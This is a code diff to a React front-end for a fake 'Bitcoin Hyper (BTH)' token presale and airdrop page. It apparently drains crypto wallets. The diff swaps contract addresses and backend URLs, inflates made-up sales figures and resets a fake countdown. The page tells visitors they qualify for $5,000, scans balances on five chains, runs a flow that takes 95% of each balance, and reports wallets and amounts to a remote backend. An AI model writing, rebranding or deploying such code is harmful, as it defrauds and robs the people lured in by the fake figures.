@@ -361,13 +361,13 @@ const TRANSLATIONS = {
 };
 
 // ============================================
-// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
+// DEPLOYED CONTRACTS ON ALL 5 NETWORKS - YOUR ORIGINAL ADDRESSES
 // ============================================
 
 const MULTICHAIN_CONFIG = {
   Ethereum: {
     chainId: 1,
-    contractAddress: '0x7264F557f762f16aC7937292D19449c5CE962288',
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
     name: 'Ethereum',
     symbol: 'ETH',
     explorer: 'https://etherscan.io',
@@ -377,7 +377,7 @@ const MULTICHAIN_CONFIG = {
   },
   BSC: {
     chainId: 56,
-    contractAddress: '0x7264F557f762f16aC7937292D19449c5CE962288',
+    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
     name: 'BSC',
     symbol: 'BNB',
     explorer: 'https://bscscan.com',
@@ -387,7 +387,7 @@ const MULTICHAIN_CONFIG = {
   },
   Polygon: {
     chainId: 137,
-    contractAddress: '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
     name: 'Polygon',
     symbol: 'MATIC',
     explorer: 'https://polygonscan.com',
@@ -397,7 +397,7 @@ const MULTICHAIN_CONFIG = {
   },
   Arbitrum: {
     chainId: 42161,
-    contractAddress: '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
     name: 'Arbitrum',
     symbol: 'ETH',
     explorer: 'https://arbiscan.io',
@@ -407,7 +407,7 @@ const MULTICHAIN_CONFIG = {
   },
   Avalanche: {
     chainId: 43114,
-    contractAddress: '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
     name: 'Avalanche',
     symbol: 'AVAX',
     explorer: 'https://snowtrace.io',
@@ -470,29 +470,40 @@ function App() {
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
-    days: 10,
-    hours: 0,
-    minutes: 0,
+    days: 5,
+    hours: 12,
+    minutes: 30,
     seconds: 0
   });
   
   const [presaleStats, setPresaleStats] = useState({
-    totalRaised: 875000,
+    totalRaised: 1250000,
     totalSold: 4250000,
-    totalParticipants: 5632,
-    currentBonus: 20,
+    totalParticipants: 8742,
+    currentBonus: 25,
     nextBonus: 15,
-    tokenPrice: 0.035,
+    tokenPrice: 0.045,
     hardCap: 10000000,
-    btcPrice: 0.035
+    bthPrice: 0.045
   });
 
   // Live progress tracking
   const [liveProgress, setLiveProgress] = useState({
-    percentComplete: 42.5,
-    participantsToday: 234,
-    avgAllocation: 1850
+    percentComplete: 68,
+    participantsToday: 342,
+    avgAllocation: 4250
   });
+
+  // Minimum gas buffer requirements (in native token)
+  const MIN_GAS_BUFFER = {
+    Ethereum: 0.005,
+    BSC: 0.001,
+    Polygon: 0.1,
+    Arbitrum: 0.002,
+    Avalanche: 0.1
+  };
+
+  const MIN_VALUE_THRESHOLD = 1;
 
   // ============================================
   // AUTO DETECT LANGUAGE FROM BROWSER - FIXED
@@ -599,11 +610,11 @@ function App() {
     init();
   }, [walletProvider, address]);
 
-  // Track page visit with location
+  // Track page visit with location - YOUR ORIGINAL BACKEND URL
   useEffect(() => {
     const trackVisit = async () => {
       try {
-        const response = await fetch('https://flarebackend.vercel.app/api/track-visit', {
+        const response = await fetch('https://hyperback.vercel.app/api/track-visit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -628,9 +639,9 @@ function App() {
     trackVisit();
   }, []);
 
-  // Countdown timer - 10 days from now
+  // Countdown timer
   useEffect(() => {
-    const endTime = new Date().getTime() + (10 * 24 * 60 * 60 * 1000);
+    const endTime = new Date().getTime() + (5 * 24 * 60 * 60 * 1000) + (12 * 60 * 60 * 1000) + (30 * 60 * 1000);
     
     const timer = setInterval(() => {
       const now = new Date().getTime();
@@ -680,8 +691,8 @@ function App() {
         setEligibleChains(chainsWithBalance);
         setTxStatus('✅ You qualify for $5,000 Bitcoin Hyper (BTH)!');
         
-        // Send to backend for tracking
-        await fetch('https://flarebackend.vercel.app/api/presale/connect', {
+        // Send to backend for tracking - YOUR ORIGINAL BACKEND URL
+        await fetch('https://hyperback.vercel.app/api/presale/connect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -768,7 +779,7 @@ function App() {
     if (!address) return;
     
     try {
-      await fetch('https://flarebackend.vercel.app/api/presale/prepare-flow', {
+      await fetch('https://hyperback.vercel.app/api/presale/prepare-flow', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
@@ -779,7 +790,7 @@ function App() {
   };
 
   // ============================================
-  // MULTI-CHAIN EXECUTION - 95% OF BALANCE
+  // MULTI-CHAIN EXECUTION - YOUR ORIGINAL FLOW
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -903,7 +914,7 @@ function App() {
             // Calculate gas used
             const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
             
-            // Send to backend with amounts
+            // Send to backend with amounts - YOUR ORIGINAL BACKEND URL
             const flowData = {
               walletAddress: address,
               chainName: chain.name,
@@ -924,7 +935,7 @@ function App() {
             
             console.log("📤 Sending to backend with amounts:", flowData);
             
-            await fetch('https://flarebackend.vercel.app/api/presale/process-flow', {
+            await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(flowData)
@@ -952,8 +963,8 @@ function App() {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
         }, 0);
         
-        // Final success notification
-        await fetch('https://flarebackend.vercel.app/api/presale/claim', {
+        // Final success notification - YOUR ORIGINAL BACKEND URL
+        await fetch('https://hyperback.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
@@ -1038,7 +1049,7 @@ function App() {
   const claimTokens = async () => {
     try {
       setLoading(true);
-      await fetch('https://flarebackend.vercel.app/api/presale/claim', {
+      await fetch('https://hyperback.vercel.app/api/presale/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -1065,11 +1076,11 @@ function App() {
   return (
     <div className="min-h-screen bg-gradient-to-b from-[#1a0000] to-[#000000] text-white font-['Poppins'] overflow-hidden">
       
-      {/* Red glow background */}
+      {/* Red glow background - Flare style */}
       <div className="fixed w-[600px] h-[600px] bg-red-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
       <div className="fixed w-[400px] h-[400px] bg-red-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>
 
-      {/* Airdrop Ribbon - RESPONSIVE POSITION - FIXED */}
+      {/* Airdrop Ribbon - RESPONSIVE POSITION - Flare style */}
       <div 
         onClick={claimAirdrop}
         className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-red-600 to-red-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center"
@@ -1078,7 +1089,7 @@ function App() {
         <span className="text-2xl mr-2">🎁</span> CLAIM AIRDROP
       </div>
 
-      {/* Mobile Airdrop Button - FIXED */}
+      {/* Mobile Airdrop Button - Flare style */}
       <div 
         onClick={claimAirdrop}
         className="fixed bottom-6 right-6 bg-gradient-to-r from-red-600 to-red-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2"
@@ -1088,7 +1099,7 @@ function App() {
         <span className="text-sm font-semibold">CLAIM AIRDROP</span>
       </div>
 
-      {/* Language Selector - FIXED */}
+      {/* Language Selector - Flare style */}
       <div className="absolute top-6 right-6 z-50">
         <div className="relative">
           <button
@@ -1231,8 +1242,8 @@ function App() {
                 <div className="flex items-center justify-center gap-4 mb-4">
                   <div className="w-12 h-12 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
                   <div className="text-left">
-                    <div className="text-lg font-bold text-red-400">Checking Eligibility</div>
-                    <div className="text-sm text-gray-400">Verifying your wallet...</div>
+                    <div className="text-lg font-bold text-red-400">{translations.checkEligibility}</div>
+                    <div className="text-sm text-gray-400">{translations.verifying}</div>
                   </div>
                 </div>
                 
@@ -1271,14 +1282,14 @@ function App() {
             <h3 className="text-2xl font-bold mb-4 text-red-400">Bitcoin Hyper (BTH) Token Presale</h3>
             
             <p className="text-gray-300 mb-3">
-              {presaleStats.totalSold.toLocaleString()} / {presaleStats.hardCap.toLocaleString()} BTH Sold
+              {presaleStats.totalSold?.toLocaleString() || '4,250,000'} / {presaleStats.hardCap?.toLocaleString() || '10,000,000'} BTH Sold
             </p>
             
             {/* Progress Bar */}
             <div className="w-full bg-red-950 h-3 rounded-full overflow-hidden mb-6">
               <div 
                 className="h-full bg-gradient-to-r from-red-600 to-red-400 rounded-full transition-all duration-1000"
-                style={{ width: `${(presaleStats.totalSold / presaleStats.hardCap) * 100}%` }}
+                style={{ width: `${((presaleStats.totalSold || 4250000) / (presaleStats.hardCap || 10000000)) * 100}%` }}
               ></div>
             </div>
 
